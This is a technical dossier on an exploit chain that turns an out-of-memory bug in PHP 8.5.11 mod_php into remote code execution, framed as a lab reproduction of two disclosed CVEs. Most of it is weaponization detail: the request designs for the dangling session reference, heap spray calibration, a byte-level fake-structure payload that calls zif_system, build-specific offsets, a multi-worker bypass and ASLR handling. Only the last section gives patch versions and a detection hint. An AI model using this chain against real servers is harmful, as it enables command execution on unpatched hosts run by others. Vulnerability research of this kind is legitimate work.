# Technical dossier: PHP 8.5.11 mod_php OOM to RCE

CVE-2026-109618 and CVE-2026-109619, white-box chain, verified on x86_64 and
arm64. This document carries the full chain mechanics. `RESULTS.md` carries
every measured run. `BYPASS.md` carries the multi-worker analysis.

Scope: local lab only. The target is a throwaway container of
`php:8.5.11-apache`. Both CVEs are fixed in 8.5.12, 8.4.27, 8.3.36 and
8.2.35. This is a known-CVE reproduction for defender and researcher
reference, not a 0-day.

## 1. The advisories

| | Advisory | CVE | Bug |
|---|---|---|---|
| 1 | GHSA-w8hw-w9fx-j79w | CVE-2026-109618 | OOM during request startup escapes through `longjmp()` before the request is fully initialized, so `php_request_shutdown()` skips `zend_deactivate_modules()` |
| 2 | GHSA-6wmf-4rv5-p3rp | CVE-2026-109619 | `PS(http_session_vars)` was published before the OOM and the session module's RSHUTDOWN never runs, so the reference dangles in persistent worker globals |

Both vector: `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`.
Affected: `< 8.2.35`, `< 8.3.36`, `< 8.4.27`, `< 8.5.12`. Published 2026-10-21.

## 2. Why the chain works

Source references are php-src tag `php-8.5.11`.

**The reference is published before the OOM.** A multipart request that
carries a file part triggers `MULTIPART_EVENT_FILE_START`, which calls
`php_session_initialize()`. Inside, `php_session_track_init()`
(`ext/session/session.c:253`) allocates a `zend_reference` with
`ZVAL_NEW_REF` and stores it in `PS(http_session_vars)`. In PHP 8.5 the
struct is 32 bytes (`gc`, `val`, `sources`).

**The OOM skips the reset.** Multipart parsing happens inside
`sapi_activate()` (`main/main.c:1906`), before `zend_activate_modules()`
(`main.c:1943`). An OOM there reaches the `zend_catch` in
`php_request_startup()` with `PG(modules_activated)` still 0.
`php_request_shutdown()` gates module RSHUTDOWN on that flag
(`main.c:1997`), so the session module's
`php_rshutdown_session_globals()` never runs and the reference dangles in
worker-persistent globals after request memory is freed.

**The consumer.** A second multipart request with
`PHP_SESSION_UPLOAD_PROGRESS` but no file part reaches
`MULTIPART_EVENT_END` (`session.c:3326`), which calls
`php_rshutdown_session_globals()`. That dtors the stale reference. A spray
value that lands on the page holding the reference supplies a fake
`zend_reference` whose `val` points at a fake `zend_array` with
`pDestructor = zif_system`. The destructor path becomes:

```
zval_ptr_dtor(&PS(http_session_vars))
  -> zend_reference_destroy(hsv)
     -> i_zval_ptr_dtor(&hsv->val)
        -> zend_array_destroy(target)
           -> zend_hash_destroy(target)     # pDestructor != ZVAL_PTR_DTOR
              -> HT_IS_WITHOUT_HOLES branch # no IS_UNDEF check
                 -> zif_system(target + 0x80)
                    -> system(cmd)
```

The fake array, the fake `zend_execute_data` (the first bucket doubles as
the execute data), and the fake command `zend_string` all live inside one
4064-byte multipart value. 4064 bytes is `0x18 + 4064 + 1` rounded to 4096:
a one-page large allocation, so the value data starts at `page + 0x18` and
spans the whole page. Any offset inside the page can be covered.

**Layout stability.** The main 2 MiB ZendMM chunk resets at every request
boundary (`zend_mm_shutdown(heap, full=0)`), so each B3 request carves the
same layout. The spray values land at chunk-relative page `0x6a` and
advance by 2 pages per index. On three different builds (x86_64 original
research, arm64 docker image, multiple ASLR states) the stale reference
landed at page offset `0x220` and the covering value was always index 39.

## 3. Request design

**A2 (producer):** multipart POST with an empty boundary. Padding fields
(default 128 x 1 KiB) shift the reference into the spray range, then
`PHPSESSID`, `PHP_SESSION_UPLOAD_PROGRESS`, one file part (publishes the
reference), then a flood block of nested empty-file parts
(`a[][a]...` names) that OOMs parsing.

**B3 (consumer):** multipart POST, no file part, `PHPSESSID` +
`PHP_SESSION_UPLOAD_PROGRESS` set, then N spray values of 4064 bytes.
Calibration: every value starts with an `IDX%04d` marker. After the request,
the worker's main chunk is scanned for the markers and each hit is mapped to
its page. The value whose page equals the stale reference's page is the
payload slot. Payload run: same shape, same lengths, with the fake structs
in that slot.

**Flood size.** The original x86_64 research used a 1 MiB block with 4000
parts. Follow-up testing on arm64 found the driver is the *part count*, not
the bytes: 500 parts with 1 MiB of filler does not OOM, 1000 parts with a
0.25 MiB block does. The floor sits between 750 and 850 parts. The shipped
default is 1000 parts, which keeps the whole A2 request under ~0.4 MB and
inside nginx's default 1 MB request body limit with no config changes.

## 4. Payload layout (inside the 4064-byte value)

Data starts at `target = page + 0x18`.

```
0x000  fake zend_array (56 bytes)
         gc.refcount=1, gc.type_info=0x07 (IS_ARRAY)
         u.flags=0, nTableMask=0
         arData   = target + 0x80
         nNumUsed = 1, nNumOfElements = 1, nTableSize = 1
         pDestructor = libphp_base + zif_system
0x080  fake zend_execute_data (also the single Bucket)
         return_value = target + 0x100
         This.u2.num_args = 1
         arg1 = target + 0x140, arg1 type = 0x106 (IS_STRING_EX)
0x140  fake zend_string for the command
         gc.type_info = 0x16 (GC_STRING), len = strlen(cmd)
         cmd bytes from 0x158
0x208  fake zend_reference (hsv - target for page_off 0x220)
         gc.refcount=1, gc.type_info=0x1a (GC_REFERENCE)
         val.ptr = target, val.type_info = 0x307 (IS_ARRAY_EX)
```

The tool also paints a reference carpet: fake references at every 0x20
offset from 0x1a8 to 0xfa8, all pointing at `target`. That makes the spray
independent of the exact stale-reference offset inside its page. Keep the
command under 80 bytes so the carpet does not overwrite the command string.

After `system()` the destructor frees the fake structures as if they were
real heap objects and ZendMM's consistency check kills the worker. The
response is empty, the command has run, Apache respawns the child.

## 5. Lab configuration

`lab/php.ini` (the values that matter):

```ini
memory_limit = 128M
max_multipart_body_parts = -1
session.upload_progress.enabled = 1
session.upload_progress.cleanup = Off
session.save_handler = files
session.save_path = /tmp
session.serialize_handler = php_serialize
```

`lab/mpm-single.conf`: prefork with `MaxRequestWorkers 1`, the deterministic
baseline. `lab/mpm-pool.conf`: 10 workers, the multi-worker case.
`lab/mpm-wide.conf`: 20 kept-alive workers, the scaling measurement.
`lab/www/index.php`: trivial endpoint. `lab/www/slow.php`: `sleep(25)`, used
as the saturation hold. `lab/nginx-default.conf`: stock nginx proxying to
the PHP container.

## 6. Offsets

Defaults are for `php:8.5.11-apache` on arm64 (libphp.so is unstripped):

```
ps_globals (PS_OFF)   0x1751f50
zif_system            0x5314f0
PS(id)                0x10
PS(mod_data)          0x60
PS(http_session_vars) 0x168 (value), 0x170 (type)
PS(session_vars)      0x1b8
sizeof(zend_reference) 0x20
```

x86_64 values from the original research: `ps_globals 0x1771a40`,
`zif_system 0x5996e0`. For any other build, run
`tools/derive-offsets.sh <container>` and pass the JSON with `--offsets`.

## 7. What the follow-up testing changed

The original dossier listed three open items. This repo closes two:

1. **Multi-worker targets.** Closed. The chain only needs both requests on
   the same worker, and pool saturation delivers that deterministically.
   See `BYPASS.md`.
2. **Black-box variant.** Still open. Black-box needs an address leak; the
   scanner crash alone does not prove ASLR state.
3. **ASLR.** Partially closed. The original lab disabled ASLR. In white-box
   mode this is unnecessary: the tool reads the libphp base from
   `/proc/<pid>/maps` and derives the chunk from the stale reference at
   runtime. Full RCE was reproduced with ASLR enabled, on a 10-worker pool,
   through nginx. ASLR-off only matters for black-box work.

## 8. Fixed versions and defensive notes

Fixed in 8.5.12, 8.4.27, 8.3.36, 8.2.35. The patch replaces the `longjmp()`
OOM path with a delayed soft OOM at the next VM safe point plus an immediate
hard OOM via `_exit()`. Defenders should also note: a flood of only a few
hundred small multipart parts is enough to reach the memory limit, so
memory-exhaustion alerts on multipart endpoints are worth alerting on even
when the bodies look tiny.
